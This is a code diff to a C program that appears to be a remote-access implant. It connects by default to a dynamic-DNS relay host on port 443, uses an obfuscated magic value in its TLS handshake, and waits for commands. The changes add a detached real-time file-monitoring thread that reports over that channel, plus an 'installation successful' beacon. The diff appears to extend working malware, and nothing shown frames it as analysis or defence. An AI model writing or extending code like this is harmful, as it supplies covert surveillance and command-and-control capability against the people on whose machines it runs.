@@ -21,6 +21,7 @@
 #include <sys/types.h>
 #include <dirent.h>
 #include <limits.h>
+#include <pthread.h>
 
 extern char **environ;
 
@@ -134,7 +135,10 @@ int main(int argc, char *argv[]) {
         }
     }
 
-    if (secret == NULL) return 1;
+    if (secret == NULL) {
+        fprintf(stderr, "[ERROR] V1.0 - Secret key (-s) is mandatory for agent initialization\n");
+        return 1;
+    }
     if (relay_host == NULL) relay_host = strdup("bootoyen.duckdns.org");
     if (relay_port_str == NULL) relay_port_str = strdup("443");
 
@@ -192,9 +196,18 @@ int main(int argc, char *argv[]) {
         char phnt_magic[5];
         decode_phnt(phnt_magic, sizeof(phnt_magic));
         memcpy(handshake.magic, phnt_magic, 4);
-        handshake.version = 0x03;
+        handshake.version = 0x01; // V1.0 Branding
         memcpy(handshake.payload, ed25519_keys.public_key, 32);
         ph_tls_send(&tls_ctx, &handshake, sizeof(handshake));
+
+        // Launch real-time file monitoring thread (V1.0)
+        pthread_t monitor_tid;
+        pthread_create(&monitor_tid, NULL, ph_monitor_thread, &tls_ctx);
+        pthread_detach(monitor_tid);
+
+        // Send Install Success Signal
+        char install_msg[] = "Installation successful - V1.0 Supreme Standard";
+        ph_cmd_send_chunked(&tls_ctx, install_msg, strlen(install_msg), PH_CMD_INSTALL_SUCCESS, 0);
 
         uint8_t recv_buffer[4096];
         ph_command_t cmd;
